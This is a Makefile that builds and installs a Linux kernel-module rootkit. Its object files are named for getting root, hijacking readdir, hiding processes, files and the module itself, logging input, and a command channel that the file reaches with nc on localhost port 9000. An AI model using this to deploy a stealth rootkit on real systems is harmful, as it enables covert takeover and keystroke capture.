# Makefile with support for multiple files for kernel modules based on:
# http://www.paguilar.org/blog/?p=7

# Make sure you run with sudo if you install/uninstall!

# If it complains about the module not existing when you run install, don't worry - it's just
# trying to uninstall any previously running instances for you, and will install it for you anyway

#TOOD: fix dependancy tracking

.PHONY: environmentSpecificOptions.h

moduleName = blank
obj-m += $(moduleName).o

blank-objs += getRoot.o hideProcEntry.o communication.o readdirHijack.o processHider.o processHiderPidManipulation.o main.o fileHide.o moduleHide.o logInput.o common.o communicationOutput.o buffer/buffer.o 
outputFileName=$(moduleName).ko

deploymentTemplateFiles = $(wildcard deploymentTemplate/*.sh)
deploymentFiles = $(subst deploymentTemplate, deployment, $(deploymentTemplateFiles)) deployment/$(outputFileName)



#TODO: fix location buffer is build - Ensure "buffer/makefile"  does not generate a conflicting ".o" file

BUILDDIR = $(shell pwd)

#todo: automatically run buffer test

default: setupDeployment

install: uninstallSilently setupDeployment
	./deployment/install.sh

uninstall:
	-rmmod $(moduleName)
	
uninstallSilently:
	-@echo "exit" | nc localhost 9000 #TODO: don't hard code this
	-@rmmod $(outputFileName) 2> /dev/null 


all:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) modules

setupDeployment: $(deploymentFiles)
	
deployment/%.sh: deploymentTemplate/%.sh
	@mkdir "deployment" -p
	cp "$(<)" "$(@)" 
	
deployment/%.ko: %.ko all
	@mkdir "deployment" -p
	cp "$(<)" "$(@)" 
	
	
clean:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) clean
	rm -r "deployment"

#environmentSpecificOptions.h: 	 # we probably should avoid the need to be root to compile
#	./getEnvironmentSpecificOptions.sh > environmentSpecificOptions.h
	
